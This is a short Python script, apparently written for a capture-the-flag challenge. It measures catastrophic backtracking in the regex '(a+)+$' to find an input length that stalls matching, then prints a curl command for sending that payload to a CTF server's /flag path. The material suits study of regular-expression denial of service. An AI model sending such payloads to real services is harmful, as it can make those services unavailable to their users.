#!/usr/bin/env python3
import re
import time

# Test the vulnerable regex locally
pattern = re.compile("(a+)+$")

print("Testing ReDoS pattern locally:")
print("Pattern: (a+)+$")
print()

for length in range(10, 35, 5):
    payload = "a" * length + "X"  # Non-matching end
    print(f"Length {length:2}: {payload[:20]}{'...' if len(payload) > 20 else ''}")
    
    start = time.time()
    try:
        result = pattern.match(payload)
        elapsed = time.time() - start
        print(f"  Time: {elapsed:.4f}s - {'Match' if result else 'No match'}")
        
        if elapsed > 2.0:
            print(f"  🎯 This length causes > 2s delay! Use: {payload}")
            break
            
    except KeyboardInterrupt:
        elapsed = time.time() - start
        print(f"  Time: {elapsed:.4f}s - INTERRUPTED")
        print(f"  🎯 Found ReDoS at length {length}!")
        break
    print()

print("\nNow test this manually:")
print("curl 'https://cpp.bootupctf.net:8088/flag/[PAYLOAD]'")
